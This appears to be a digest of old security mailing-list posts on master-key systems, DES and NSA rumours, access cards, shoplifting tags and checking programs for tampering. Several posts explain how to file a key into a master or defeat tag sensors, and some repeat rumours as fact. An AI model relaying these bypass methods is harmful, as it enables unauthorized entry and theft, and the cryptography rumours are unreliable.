building and found to my amazement that the key opened about 3/4 of
the doors to the building.  As a matter of fact, I could get into just
about any room but the science labs.
    The technical explanation for this is that the school had 6-pin
Falcon locks, and I had a 5-pin Kwikset standard house door lock.  The
inner 5 pins of my key were very close to the inner 5 pins of the
master (I eventually saw it after a long explanation to the
Vice-Principal) and the little notch to make the key go in smoothly
was the same height as the 6th pin on the master.  Thus, the lock
"thought" that my key was the master.
    Eventually someone stole all of the keys to the building and hid
them in the main office ceiling (they didn't find them for 18 months)
and the whole building was re-keyed, to a much better system.

To answer the question posed by the original poster, I would say that
the locksmith who keyed his building did a bad job.  The master should
have some pins higher than most, some lower.  It sounds like your
master has all pins lower than the individual keys.  Therefore, yes,
you should be able to file your key down to the master and use it for
everything.

Subj:	[2449]  master keys

Ah, finally someone *else* talks about locks...

Master key systems can be done correctly or done stupidly.  Normally
[i.e. correctly] the cut heights for the master are mixed as to whether
they're above or below the cut heights for the non-master key[s], and 
placed a sufficient distance away so that there's no possibility of
placing pins at the master position by wiggling the slave key or inserting
it to funny places.  Often mastered systems use very thin splits [the little
wafer inserts between the pin and the driver that allow the lock to open
at different cut heights] which can jam or fall out of the cylinder.

If the maid's key cuts were all lower than the cuts on your office key,
then the system was done stupidly, and you could generate a master by
cutting your key down to the master level.  [You can determine the master
level by taking your office lock apart and loading in just the master
pins/splits as a template.]  I suspect that there are quite a few systems
out there that are done this way.  Suspect this if all the slave keys look
like they don't have too many low cuts in them.

Sometimes odd-shaped drivers called mushroom drivers are used in heavily
mastered systems, in an attempt to make them harder to pick.  These will
allow the plug to cock over a little bit during picking but with the
given pin in the wrong position, so that additional fiddling has to be done
to get it to the right position.   Some older Russwins use ball bearings in
place of rounded pin ends to reduce wear in heavily-used locks.  [If you take
your lock apart, of course, keep very close track of where everything went,
or it obviously won't work anymore...]  To disable the master position and
only allow your office key to work the lock, you'd normally have to obtain
different pins of the right heights.  You might get lucky, however, and
find two pins whose mastering parts could be swapped, changing the master
height there but leaving the slave height.  Then the maids couldn't get in
but you could.

I suspect that there are quite a few of us that majored in locksmithing
in high school, and were dearly loved by the deans.  If only I had had the
presence of mind back then to explain to them how locks are perceived as
little puzzles to take apart and solve, not as something standing in the
way of theft.

Subj:	[3469]  Secure phones

 The NSA is involved in distributing these phones as part of a more general
effort to get at least some US companies to have reliable security.
	The story I've heard (though I don't have it from classified
sources) is something like this:

1. DES was originally certified, but was designed with a short enough key
that NSA could break it by brute force. (It IS a federal law that no cipher
may be used for international traffic that NSA can't break, so the
permeability of DES follows from reading the relevant US Code sections.)
The classified algorithms are said to differ from DES mainly in the
length of their keys.
2. Recently, someone furnished NSA with an efficient DES breaking
algorithm. This was said to take 1.5 hrs. on an IBM PC to break a DES
cipher. I understand that hard details of this have been classified
and NSA does NOT particularly want to confirm this. Still, some NSA
employees have confirmed that DES is not nearly as secure as was
originally thought. Thus, NSA isn't going to certify DES again, at least
not willingly, because they KNOW it's breakable. (It's been suggested that
a different key scheduling data area could give a more secure algorithm,
but the generator for the key schedulers is not available, at least
not readily.) An Australian friend of mine mentioned he saw an article
on breaking DES back in '79 or '80 in the Proceedings of the Soviet
Academy of Sciences, but has since told me the article deals only with
certain classes of keys. (BTW, it also mentions that if you insist on
choosing large PRIMES for public key cryptosystems keys, the public
key systems become fairly easy to crack also; what's needed are
RELATIVELY PRIME numbers, not primes.)
3. Since DES has proven embarassingly easy to crack, and since large
amounts of money are "protected" by it, NSA is proposing to let industry
use the "real stuff", the algorithms they use themselves, which
hopefully are less permeable. To do so, they furnish algorithms and
keys (preserving the ability they have by law to decipher the text), but
are paying fairly large sums to develop these phones and other boxes. A
good deal of custom microelectronics is involved. And this is why you
see NSA discussing crypto phones etc. (You are of course aware I trust
that ANY phone conversation that gets onto microwave is potentially as
open to interception as home radiophones are...and many of thesse
links to industry ARE monitored...)

I've heard another story someone might comment on:
Some US company (I forget which; it's not important) sent a binary
copy of an operating system over wire to England. However they
used the unix crypt tool on it first, more than once and with
different keys. The story is they got a call a few days later from
NSA demanding they give NSA the keys used to encipher it.
	The algorithm is just character XORs with a string. But if
you do it several times with strings of lengths that are relatively
prime, couldn't the effective string become the product of the
key lengths, and quickly grow comparable in size with the original
message? Does anyone out there know enough cryptography to tell me
whether this is really a super cheap and strong cipher, or whether
it's just a minor nuisance for folks who go in for this sort of thing?

computer software at an educational discount.:

[in the directions] "Make a photocopy of your current Student ID or
Faculty card and...some well known form of id. displaying your
Social Security number,... (WPCORP will hold this information strictly
confidential and use it only to guard against duplicate purchases.)
[Then later on...] If you have serious reservations about providing a
social security number, call Educational Development...to establish

     In the world where it is difficult and inconvienient at best to
not automatically provide the SS number when asked, I thought this was
a nice change.

Subj:	[2275]  Caving Horror Stories (III)

[This came over another mailing list -- I couldn't resist.  Is *your*
town's sewer system a threat to national security?   _H*]

From: commgrp@silver.bacs.indiana.edu
Subject: Caving Horror Stories (III)

A  caver  from Austria who recently visited the U.S.  told  some  grim 
tales  about caving in Eastern Europe,  especially E.  Germany.   He's 
translating _CAVER OF FORTUNE_ into German,  with added advice on  how 
to do keep a low profile while caving in E. Europe.

East   Germany  has  a  law  against  going   underground.   Literally 
interpreted,  it  says  that you must stay out of your  own  basement.
Apparently, the law was enacted after a few people tunnelled their way 
out of E.  Berlin.   The government does support sports,  however,  so 
caving clubs are allowed.   The party tries to plant spies in the cave 
clubs but everybody knows who they are, so they take them on extremely 
rough  cave  trips and thoroughly trash them!   Club  newsletters  are 
required  to contain party-line material about how caving advances the 
cause  of the state;  this is usually accomplished by duplicating  the 
same page in each newsletter issue.

European  cavers  explore old mines and tunnels,  as well  as  natural 
caves.   Networks  of artificial tunnels are common under old European 
cities;  they  are ancient sewers,  were used to hide  from  invaders, 
etc.,  and  their  locations are unknown to present city  governments.
The  cavers  in  an  E.  German  city  (which  must  remain  nameless) 
discovered an iron door on the river bank, overgrown with weeds.  They 
picked the lock,  made their own key,  and explored the tunnels.  They 
found treasure which was hidden there during World War II by the local 
inhabitants, most of whom were killed whe@he city was bombed.  Being 
caught in the tunnels means a one-way ticket to Siberia,  so it's  the 
ultimate stealth-caving!

Cave  locations  are  state secrets in  eastern-bloc  countries;  some 
French  cavers were caught at the border of Yugoslavia with a  roadmap 
on  which they had marked cave locations;  they were jailed as  spies, 
and it was three weeks before the French embassy bailed them out.

I'm not an expert but I had a cubemate that studied 
locks and locksmithing.  I think if you could get a couple of
other folks keys on your floor, you could determine which
parts of the key were common and file the remainder away.

I think the general trick is that the tumblers in the 
lock have a couple of cuts not just one.  The master key
pushes (one or more) tumblers to this second position.

Seems on reflection that there are ways of making master keys
that cannot be deduced from looking at non-mastered keys, but
I'm not sure every lock maker employs these techniques.

(sorry if that rambled a bit, but I'm trying to recall five

Should someone wish to start collecting info about me, that person is

You must be very carefull verifying programs to see if they have changed.
Often a program can be patched so as to remain the same size by using
partially full pages or replacing seldom used routines. On many systems the
modification date can also be changed back to the origional date (this is
nice when copying files).
If you keep another copy of the program to run a diff against it should be
hidden so that both the program and the copy aren't changed. Best would be
to bring a copy in off some removable media to do the comparison. The medium
should only be mounted when the person to do the comparison is there in
person. Even then the program for reading the file in or the diff program
could have been tampered with.

The locks have multiple-segment tumblers.  One of the split-lengths
are the same in every lock, so that a key that has just those settings
will open all of the locks.  You use the same idea to have "submasters"
and "grandmasters".   I don't remember exactly how it typically goes,
but if it were me, I'd have the bottommost tumbler splits be the ones for
the most wideranging master (that is, the tumbler splits that require
the most pushing-up to align and so the largest key height).  At least this
would mean that (as you suggested) it would take more than just ANY key
and a file to make up a master key.

Just an observation on what appears to be the "standard practice" of setting
up master/sub-master keying systems.  The way things are set up where I
work, it seems that individual keys have the shallowest cuts.  Sub-masters
have more/deeper cuts, and master keys have the most/deepest cuts.

Now, to my untutored way of thinking (I am not a locksmith), this is exactly
the *wrong* way to do things.  Conceptually at least, it seems like it is
fairly easy to "convert" an individual (single door) key into a sub-master or
master with a file.

Actually, this is a little stronger than a theoretical approach.  I know of
people who *have* converted individual office keys into departmental masters.
However, this was years ago; the statute of limitations has long run out, and
the buildings/doors in question have since been re-keyed.  [This paragraph is
here for the purpose of "coverin' me behind"!  :-) ]

Anyway, this whole situation strikes me as gross security risk.  I have
discussed this issue with our locksmith, but have received an unsatisfying 
answer.  He claims that this is just the way things are done.  Well, I don't
buy that.  Does anyone out there have a good technical reason why master/
sub-master keying systems are done this way?  (Ease of implementation is
*not* an acceptable technical reason, by the way.)

Subj:	[792]  SSN profit motives

     Anyone who has information on you indexed by SSN can sell it,
reducing your privacy and possibly reducing their opinion of you so that
you are harmed.  The very fact that they have the data indexed by SSN
means that anything they care to file on you can "travel" very far and
fast, and sometimes it is not factual.  Mistakes happen, and the first
party can clean their files, but they have no power over the persons
they copied it to....  Even if the organization collecting the
information is not sharing it, the indexing by SSN makes it salable by a
thief or future owner.  Security, yours and mine, comes from giving out
information on a need to know basis.

Subj:	[2976]  re: Master keys

Well, before I got into the computer biz, I used to work in a hardware
store.  One of my jobs was re-keying people's locks.

The principle of a key is that when it is inserted into a lock, the ridges
on the key raise these little pins inside the lock cylinder.  If the right
key is inserted, the tops of all the pins are flush with the stationary
part of the lock which also has a set of pins of various lengths.  

The best way to describe it is to picture a 2 sets of pins.  When you insert
your key, the bottom pins rest on top of your key and are pushed up into the
top of the lock, against a second set of pins.  The lower pins are all 
different sizes which is why your key has different heights.  If all the
bottom pins are flush with the top of the lock cylinder, then you inserted the
right key, otherwise, some pins will either stick up past the point where
the cylinder turns and protrude into the upper cavity preventing the lock from
turning, or the pin will not stick up high enough in which case the upper
pin which is spring loaded will protrude down into the lower cavity again 
preventing the lock from turning.

A "MASTER KEY" is any old key.  The difference is in the upper pins of the 
lock.  Instead of having only one pin in each upper chamber, the upper
chamber is fitted with a series of pins with different heights.  So there
are segments instead of only one pin.  If the correct key is inserted in
the lock, the bottom pins are all flush and the cylinder turns.  If
the master key is inserted, some of the bottom pins may be flush.  The ones
that aren't correspond to a spot where the bottom pin is not pushed up far 
enough so that the top pin is pushed into the lower cylinder.  However
because the upper cavity was fitted with different sized segments (called
"master pins"), one of the segments is flush with the top of the cylinder
and the lock still opens.  In order for this to work, the master key must
be known, and each lock must be fitted with pins which allow the primary
key to work, and then the master pins are put in.  Because the top pins
have to have a sum-total of a certain length, the segments can be put in
any combination allowing more than one key to act as a master.

This is why locks can be picked with a hairpin (it's tricky, but it *does*
work).  All you have to do is lift the pins to the right height and turn.
The problem is overcoming the springs which act to force all pins down into
the cylinder.

Also, if you try a key in a lock, and any of the ridges cause the pins to
be raised up such that the lower set of pins pushes up into the upper 
cavity and the upper pins can't move any higher, the key will not be able
to fit any further into the lock, which is why sometimes your key won't
fit in someone else's lock.

Hope this answered your question.

Subj:	[1040]  Master keys

Along the lines of keys and master keys, the system isn't always as
good as people make it out to be.

When I was in high school, I happened to be a computer consultant at
the college across the street, and they gave me a key to open the
computer room in the morning. One day, I discovered that the key blank
from the college computer room fit into the lock of the highschool
computer room (which also had a tendency to be locked in the morning.)
Not only did it fit, but it also turned in the lock!

After comparing my key with the key of one of the teachers, we figured
out what happeend: the college computer room key fit about half of the
pins for the high school computer room's "slave" key, half the pins
for the "master" key. A real fluke, but it effectively gave me a
generic computer room key, for which I was greatful.

>That is hardly worthwhile.  What you have done MAY stop a true amateur, but

Waitaminute, do we have a case of security-macho here? Maybe he's only
trying to protect against the "true amateur"? Remember, the only
person that's going to bug his phone is a person with a motivation to
do so.  More often than not that will be someone w/in the organization
who isn't going to expend the resources to hire a pro, but if a pair
of alligator clips will do the job, what the hell, right?

Years ago I had an office which had a wire-closet for a good portion
of the building behind the door. I got curious and began playing with
a pair of alligator clips and found a phone line which appeared to be
unused.  This was useful because my phone line could not dial
off-campus while the discovered one could (not long-distance, that
took an access code, but even up the corner for a pizza.) [standard
disclaimer: this of course was on another planet where such things are
encouraged.]

If someone had simply put a locked box over it I'm sure I would have
never bothered to investigate (unless it was such a dumb lock...but
that's a different story.)

Just a sort note.  I retired from the US Army (MI).  I inspected sites
for security problems (TEMPEST).  Just to let you know, there is so meany
ways to monitor your PC.  We could monitor your phone line at the house,
at the pole, at a transmitting site, or even monitor your power lines.
There are more ways to do it then one would normaly think about, and alot
of the things that one would need can be gotten localy.

If you have information that you don't want anyone else to see, filter your
power line, put a ground screen on all four walls, floor and ceiling.
Ground your PC to a ground point that you can only get to from inside the
room, and now place your PC in a sheilded box, with you only access toward
the largest mass of your house.  This will do for a start.

This may sound like a joke, but this is just some of what you would have to do.
To me, it sound like to much work and I just don't have anything that I want
to prevent anyone from getting so bad.  But to secure your phone connection box
is not a bad idea for other reasons.  You can never tell when someone may
connect to it and make a call.

Subj:	[1956]  phone security

It's always amazing to hear the stories floating around
about comsec. Now another DES crack story withthe usual cast
of characters: a grade student with a PC finds the famed 
trapdoor, --hidden years ago by a combination code designer
past chess grandmaster.  The proof is shown to civil servants
from Ft. Meade who'se first instinct is to banish the student
to a little known military reservation outside Atlanta, Ga.
Of course, the officials knows nothing about this and have no comment
on the specifics.  But the student told his friend, word is out!

OK, why not? But I figure this is the tenth such story in the
last two years.  

As I understand it (from what I read in the press, specifically
Cryptologia) DES can be attacked brute force; however, it's
expensive.  Now there is a cost per message were as formerly, the
traffic was free to harvest.  More traffic, more cost and the
result is that you have to divert money from other more important
projects to keep brute forcing all those DES messages. So 
management makes you limit your DES haul in favor of
more productive projects. Remember, DES is usually
low grade traffic.  Your need a lot of it to makes sense
of important things, --which is now expensive.

Again going back to the press we see David Kahn writting in 
the Fall 1979 issue of Foreign Affairs " Cryptography goes
Public" about intercepting telephone voice traffic. You can
read what he says for yourself but basically, the STU-III
telephone (described in the New York Times about six months
ago) is to help keep government information private, not
to help the telephone companies become "secure". 

I am looking foward to the next DES break story.  In fact I
may write my own: perhaps a former world war II cryptographer
notices an uncanny pattern in s-box number two whose 
mirror image he sees in the key bits....

Subj:	[1781]  Electronic door locks and anti-shoplifting devices.

We  have  a  very  neat  security  system  on  our  computer  room  here.
Authorized people carry cards which are held in front of 'readers' at the
doors to gain access.  Each card has a number which the  security  system
hands  to  a  computer  which  determines  if  the  person  is  currently
authorized.  The cards are credit card sized  with  no  visible  magnetic
strip.    The  center  layer of the card looks like a glass-epoxy printed
circuit board.  You can usually get in the  door  just  by  holding  your
wallet close to the reader.  The manufacturer is Schlage Electronics.

Does  anyone  know  how  this  system  works?    The  readers determine a
4-digit(?) number, so it can't be that simple.  How expensive is  such  a
system?    It  is  very  convenient  to have one card that can be used on
several doors,  saves the cost of re-keying locks if one is  lost,    and
provides an audit trail of who has been where.

How  about  anti-shoplifting  systems  that  work  on similar principles?
Stores that use them either remove something from a product  when  it  is
bought,  or pass things over a demagnetizer(?) when they are paid for.  I
have  disassembled  several  things  that  I  have  purchased to look for
whatever they put there,  but haven't found anything.    I  suspect  that
only a random sample or items actually have protection from being carried
out.

A  final  note:   The two systems must be very similar, because I am told
that the computer room  card  will  trip  some  of  the  anti-shoplifting
alarms.  Oh,  the joys of being a DP professional.  :-)

Assement series on Federal Governement Information Technology (3 vols:

Financial Integrity Act, National Security Decision Directive 145 (the
biggy: "national Policy on Telecommunications and Automated Information
Systems," which sets NSA as the focal point for both military and civilian
information security) and OMB circular A-130 -- None of which support
your claim that there is statue (or even policy) prohibiting use of a
cipher that NSA can't break.  The Foreign Intelligence Surveillance Act,
which made NSA into a legislated government body doesn't mention it,
either.  Even the idea is suspect: wouldn't that mean that there was
a list somewhere of ciphers that NSA couldn't break?!  Doesn't sound
like the kind of list I'd want to see passed around.

That doesn't mean I don't believe that NSA tries to ensure that it
can crack every message, say by getting the key size of DES cut in 
half.   I had an extended correspondence with one of the designers
of DES where I convinced him that NSA cut the key size so that
it would be vulnerable (you can have a copy of those messages
if you are curious).  I just don't believe there is any statute
that says such a thing, and you should be careful about making
any claim that there is.

was to create a secure door for the video room, which would open
to my key, and no one else's. LMI used the standard system where
your office key was also the front door key. This is a varient on
the concept of a master key. Rather than one key opens many
locks, this is one lock with many keys. Obviously, you can't use
the split-pin idea to make that work, you'd need an almost
infinite number of sections in a large building. Instead, the
lock only has some subset of the total number of pins (3 pins in
a 5 pin system, for example). This makes for an interesting trade
off. By definition, all the keys must share a certain number of
common pins. 

Therefore, there is a trade-off. The more pins they share in
common (and thus, the more pins on the outside lock), the more
secure the outside door is. On the other hand, the less unique
pins between keys, the easier it is to gimmick someone elses lock
given you have a key.

It was VERY easy to gimmick LMI locks...

Subj:	[1162]  Master Keys..

Being a recent graduate of the Foley Belsaw Institute's course in locksmithing,
I would like to describe the technique for master keying and the way one can
make a master key.  Most master key systems have 2 or more shear lines.  One
shear line is for the change key (the key which will open that door only).
The second shear line is for the master key.  If there are any other
additional shear lines they would be for the grand master key, grand grand
master key, etc.  In a good master key system a change key will not have
any of the same depth cuts as the master and the master will not have any
of the same depth cuts as the grand master, etc.  So there is no sure way
of making a master key from any number of change keys.  The only way I know
of to make a master key is to remove a lock from service and either pick or
open the lock with a key then dump the pins and determine how many keys will
open the lock.  Make all of these keys(proably no more than two or three keys)
and see which one opens other locks.

Actually, best would be to have the ``copy'' on an isolated system.  You
then detach the ``original'' from the public system and have the
isolated system inspect it (but of course, not execute any files that
are on it).  Just as programs like ``crypt'' can be subverted, so can
``diff,'' ``ls,'' and even ``cat.''  Or things can be done directly in
the operating system, e.g., setting it up such that ~cracker/bin is
implicitly at the front of everyone's path -- then /bin/crypt will
always look just fine (although no one is ever actually running it).

Similarly, login shouldn't be handled by a system that can be remotely
programmed.  Properly done, password modems should be considerably
more secure than letting login verification be handled by the
``exposed'' system.

Of course, much of the hyper-concern about computer security is
misplaced.  Traditional security people say you should set up security
so that it costs more to break it than it is worthwhile to break.
On a computer system, we should probably say that you should set up
enough security so that ``system bugs'' cause more problem than
``malicious users.''  Using this approach, many systems are
exceptionally secure.

Subj:	[2458]  Re: Master/sub-master keying systems

	OK, here's the poop on master/grandmaster systems, from one who
was at one time a bonded locksmith.

	Master/grandmaster systems should not be used unless absolutely
necessary.  It's like the difference between a system that has a root
password and one that doesn't.  However, since these are physical
systems, the mere existence of the "root password" actually weakens
the rest of the security system.

	Yes, those folks who note the existence of several "splits"
in a single pin are correct.  That's how the trick is worked.  However,
note that lock pins are not very large.  There is a limit to how close
splits can be made, as these mean very thin disks of metal between
the splits.  These disks wind up riding around the cylinder wall
every time either key is used; sometimes on the inside and sometimes
on the outside, depending on which break is used.

	It can sometimes happen that a disk which is too thin will turn
sideways in the chamber.  Result: lock-out.

	In addition, the more splits there are in a lock, the easier
it is to pick, for reasons I won't bother with here.

	Now to the question of keys.  Remember that a key is just a
long metal blade.  The deeper the key is cut, the thinner the blade.
The thinner the blade, the more likely it is to break off in a
recalcitrant lock.  Result: lock-out.  The answer is then that most
keys should be of the thick variety, since the sheer number of key-uses
is far larger than the total number of grand-master uses, even if the
grand-master is in constant use.  So, individual keys get the higher
cuts.

	Of course, you could argue, you could arrange the grandmaster
such that some cuts are very high and some are very low.  Indeed this
is sometimes done, but there are two reasons against it: 1) A low cut
in the middle results in a weakened key: it has a "thin spot" and can
break.  2) In general, for all keys, there is (or should be!) a limit
on the maximum "jump" in height from one cut to the next.  Remember,
as the key goes in and out of the lock, the pins have to ride up and
down.  Too great a difference between one cut and the next results in
a very steep "roller-coaster" ride for the pins.  Unless they are very
well-lubricated, this can result in a stuck key.  Result: lock-out.

	Hope this settles the hash of this question!

Subj:	[1342]  Unscrambling satellite signals

I don't own any sort of satellite reception equipment, so don't really
keep up with the latest developments.  Prior to this weekend, I had
the impression that the signal scrambling being used by most (all?) of
the major signal providers was DES-based and basically fool-proof.
I believe there was some discussion of this subject on this list several
months ago, but don't recall whether the following was covered.

A friend of a friend bought a Video-Cypher II box some time ago with the
intention of paying a fee to the various providers of signals he was
interested in.  This weekend I learned that this person obtained a chip for
the Video Cypher II box which will unscramble ALL signals at ALL times.
The only instructions that were given when this chip was installed were:
"Make sure that your box is turned on for at least 8 hours on the first
working day of each month."  (Presumably to get all the encryption key
updates...)

So it looks like somebody has actually "cracked" the system.  Is this
general public knowledge by now?  Note that when I say "the system" I do
NOT mean DES itself.  It sounds to me like this chip most likely exploits
a flaw in the key distribution procedure.

I remember hearing that this one goes BOTH ways, i.e. there are two

for malpractice, and the other list is for patients and lists doctors which
have been sued and what the results of those suits were.

So while doctors are trying to avoid patients who sue a lot, patients
are looking for doctors who get sued a lot (and lose).

Subj:	[1223]  Re: Master/sub-master keying systems

John is correct in his observations concerning deep-cut master key systems.
Having earned a living as a locksmith for the past six years I can give a
technician's view of master keying.  Various sources have held forth for the
use of both deep and shallow masters.  My mentor in the trade taught me to use 
as few master pins as possible and shallow master cuts.  This relates to 
the principal of making the system as small as possible while allowing
for some expansion.  Each master keyed cylinder has 2^N (N= number of master
pins) potential keys.  The system has 4^N potential operating keys.  Given
these values the reason for keeping to a small N is obvious.  In practice
I have found no need to use deep masters and anyone who does so is likely 
to be following his early training at the hands of a deep master proponent.

Subj:	[1846]  re: Master keys

There is a very simple reason why master keys tend to have less metal on
them than the non-master keys.  It's easier to make them that way.

Let's take a simple example: A lock that will have one standard key and
one master.  To key it you start with an empty cylinder (no pins in it
yet), the regular key, and the master (with less metal than the regular
key).  Place the regular key in the cylinder and try different length
bottom pin segments in each position until each position contains one
bottom segment that is exactly the right length to be flush with the
edge of the cylinder.  Remove the regular key and insert the master.
All of the pin segments will now be too short.  Add middle (mastering)
segments, 1 each, in each position until their tops are again flush.
Now insert the cylinder into the lock using the proper tools.  The top
pins in the lock are all the same length, no changes in these pins are
made.  Done.

Notice that this is basically a trial and error process.  If the master
key has less metal than the regular key(s) it can be done in a single
pass.  If however, the master has more metal in one or more positions,
several passes will be required.

In a major job with many locks and several levels of mastering, the
problem of a sparse master should never occur (unless the locksmith is
either lazy or incompetent).  Such jobs require significant planing and
all of the necessary pin segment lengths can be determined in advance.
Keying the locks is then a simple matter of dropping in the right pin
segments in the right order.  It is not even necessary to have the keys
cut yet.

Please note that I am not a locksmith, only an interested observer.

Subj:	[1029]  Re: master keys

Several years ago there was a report that MIT had been hit with numerous
breakins (some versions say the intent was pranks, not burglary) which 
had been accomplished with keys which opened various locked offices.
According to the reports (more accurately: rumors) going around the Institute
the keys were manufactured by students who had removed the door locks from
the bathrooms in the main MIT building (that's buildings 1 through 10) and
had disassembled them to find the common pin breaks.  All they had to do 
then was to file a key which aligned the common breaks with the cylinder
radius; since the locks represented doors from all parts of the building
(despite the range of numbers it's one structure) they had a master for
almost every door.

Except for buildings in which the bathrooms are routinely locked, who would
notice that the doors were missing the lock cylinder?

You would only need one copy of the programs on a hard disk, and the

Have one pc in your lab designated as a file server.  Students

 Those devices are manufactured by the Knogo corporation and are extremely
expensive.  They are not terribly effective, and you need to have someone 
keeping a close eye on things---an easy way to beat the system is to put the
tagged item underneath or above the sensor panels.  The tags are easy to find
if you're looking for them, and not very difficult to remove.  I spent a year
managing a B. Dalton Software Etc. store, and we always had shoplifting 
problems.  I'd recommend having people check out software by handing over their
student ID or whatever instead.  We were told that the Knogo system was there
solely to scare amateurs: seeing the sensor device, which probably worked, the
amateur would not rip off the store.  This cuts down shortage (which also 
includes employee theft, I think) from 30% (unprotected) to 3% (!).  Paying a
work-study student will probably cost a lot less than installing the alarm
system, and you won't have false alarms, etc.  Even properly tagged, activated
software won't always set off the alarm, so I'd say you're looking at catching
someone 7 out of 10 times (if you're lucky)...

        To Wendy Fraker, who wants to track cars: I have never seen such a
device advertised.  Unless it were a complicated (=expensive) inertial
guidance system gizmo, it would basically be something which gave off a signal
which you located by triangulation.  Maybe a Walkman (TM, or (R), or something)
connected to a cheap walkie-talkie would work.  But I think you'd need 2
distant locations which could both pick up the transmissions & communicate to
each other.
        To Phil Benchoff, who asks about magnetic shoplifting security devices:
Our library uses a magnetizable glue on its books (maybe some iron oxide is in
it).  They just put a drop in the binding of a new book.  So if the stores are
using glue, naturally you wouldn't find anything when you disassembled your
purchases.

 I installed a new, higher horsepower garage door opener about  a
 year ago (after the old Genie died).

 Several times, several months back, I noticed  that  the  garage
 door  was up but shrugged it off as having forgotten to close it
 at night.

 A couple of weeks later the garage door was up again, only  this
 time, several things had been stolen out of the garage.

 I changed the codes, but several times at night  we  caught  the
 door just *opening* by itself with appearently no one around.

 Finally, I installed a "shunt" circuit to the  opener,  so  that
 the door can be manually switched to not open.

 In retrospect, the door has *never* come up by itself during the
 day.  The old door never came up by itself, period.  They do use
 different  controllers.  However,  most  (if  not  all)  of  the
 "openings"  have  been  before  or  after  military  hellicoptor
 passes.

 I remember reading about how alot of door openers get "openitis"
 when   the   Presidential  Air  Force  One  plane  is  in  town,
 appearently having to do to with signal jamming.

 PS: The idea of "cycling thru the codes" is appearently also
     becoming a problem with the newer "remote" auto alarms.

<>Does anyone know where to conveniently purchase some kind of device

There's a local company that makes a gizmo called a LoJack.  It's
a gizmo you conceal in your car.  If the car is stolen, you call the
police, who transmit an encoded activation signal.  The LoJack receives
this signal and activates a radio beacon, and police homing radios can
then locate the car in a few hours.  Apparently it works quite well
and has a range of several or even several dozen miles.  It is currently
available, but I think it's not cheap (wild guess: $500).

I don't know, and rather doubt, whether you can buy one for your own
use.  You have to register it with the State Police when you install it,
presumably so they have a record of the activation code or something.
(For paranoids only:  this is really so they can track you whenever
they want.)  And you probably need some sort of license for the transmitter
on either end.

The contents of that magical little card (or of the anti-shoplifting

One of more (for a 4-digit system, 4) layers of metal foil, cut in
such a way as to resonate at a certain frequency.

Contents of the door-watching box: an rf source, set to sweep across
the range of frequencies for which the foil layers are set.  Further
contents: an rf dip detector, which notices at which frequencies the
RF power takes a sudden dive (being sucked up by foil layers).

The freqs are numbered, of course, and you can assign a number to any
set of M out of N selected.  Note that order is not important; thus
(eg) {1,4,8,17} will look the same as {1,8,17,4} to the device.

Simpler systems may just (like our school library) have one piece of
foil glued to the inside of the book.  If that freq dips suddenly,
you sound the alarm.  Print something such as the institution's name
on the foil sticker so that people don't realise that it is not just
a name-plate, of course.

Subj:	[1338]  NSA underwater tap

The discussion earlier of what safeguards can be made to protect ones
privacy remind me about a description in the new book on the CIA from
1977-1985 (???) I forget the book title, (its in hardback), It describes
an operation which Pollard subsequently had leaked to the Soviets, involving
the NSA and the Navy. The goal was to place a passive listening device 
AROUND the underwater cable. This device records the line transitions by
command for a one-shot eavesdrop on sensitive military data, The Soviets
were so convinced about the security of the cable they did not encrypt the
data, as opposed to Soviet land-based comm. which has excellent coding.
Once the recorder had done its stuff a submarine would launch a midget
earth walker/diver to collect the tape and insert a new one. 
The device was made so that if the Soviets decided to examine the cable, 
the device would fall away staying on the bottom, leaving the cable
'untouched'. I think the book called the operation 'Blue Bells' (?), anyway 
they realised when the device was missing that the job had been compromised.

I think a discussion about such interesting security penetrations would
be of interest to many.

One more lock note:  one of my first real paying jobs was as a bellman
(read: Flunkie) at a local franchise hotel.  They had just over 250 rooms,
plus assorted locked service areas (housekeeping, maintenance, storage,
etc).  Although not a real bona fide locksmith, one of my tasks was to
cut keys once a week, as plenty of people don't leave their keys when
they check out.  All the real keys are kept in a locked cabinet behind
the front desk (including masters) and all keys given to guests are just
copies.  There were three key blanks:  two for guest rooms (divided in
half by floors, there were two systems) and one for maintenance areas.

The maintenance areas were not on a master system at all (somewhat
obviously).

The rooms had (1) the "maid" key which was a straightforward master cut
from the regular room blank, and (2) the "security" master which was
identical to the "maid" key except that it had one additional pin; in
order to duplicate the "security" master (which you weren't supposed to
do, but you get tired of signing keys in/out to do room checks) you had
to cut the room master back one additional tumbler location and extend
the horizontal grooves back through the extra space.

The "security" master would open the deadbolt!

I've always felt safer with a chain or doorstop than a deadbolt ever since.

As I recall from a magazine article in Radio-Electronics, this particular

The net result was that the scrambler company could disable all the

In general these schemes could be based on taking a checksum, CRC, or
similar data-reducing agregate function of the data.  If you keep several
mathematically independent functions of each file you can check the
system state with comparitively little overhead and acceptable certainty.
The idea is that it is hard to find a patch which simultaneously preserves
each check function.

Using the reduction allows one to base the scheme on a paper listing
or equally secure object.  Of course one has to trust the check program,
and recursively the tools used to load the program, etc.  If you postulate
that the system has been corrupted it is very difficult to see how
to get to a trustworthy checker.

Assuming unix, for instance.  You could mount a removable pack
containing the trusted program, and we can assume that the
virus hasn't invaded the mount system call.  Now what?  The
shell is corrupted, so you can't be too sure it will really
execute your checker.  The kernel may be infected and translates
calls to open on the kernel to open calls on a copy of the old
kernel.  Isn't security fun?

In general security, or trustworthyness, is a property of the
system which must derive by strict induction from a trusted
base condition.  Once the chain of induction is broken by
an event which _might_ allow a virus into the securtity base
you cannot trust the system again.

You _can_ freeze the system and audit it from the outside.  On my
system I would build an audit program on a bootable floppy and
keep it in a safe place.  I'm not that paranoid - I believe that
I'm not a sufficiently desirable target to expect really sophisticated
viral attacks.  But if I were I'd do a floppy boot and run a security
audit before I made backups each day.  The possibility of this is
assured by my faith that the hardware physically cannot alter the
bootstrap ROM.  Of course I have not proved the boostrap code, but
its operation is sufficiently removed from the area of interrest that
I'm pretty sure it cannot be subverted.

This is generally known as a Control Key.  Only the Locksmiths or Police
or other *trustworthy* people are supposed to have these keys.  At the school
I attend we have such a beastie (or BESTie) for a key system and one of 4 keys
will take care of opening any lock on campus.  These are

     1) Your individual key
     2) The Department Master Key
     3) The Police Master Key (opens any key with that particular core)
     4) The Control Key (which just pulls out the core so it can be changed
         or so that the latch can be turned with a screw driver....)

  In general, professional key systems are made so that you can't jiggle your
key and get it to open another lock, by 'hitting' the master pins....Usually
this is accomplished by using high tension springs or mushroom drivers if they
have to have a large # of keys open the lock.

Subj:	[1462]  mastered systems

Creating master keys is *not* a trial-and-error process.  A correctly
configured system never sees brass until it's all planned out as a huge
chart of cut numbers, or actual thousandth-inch measurements.  All the
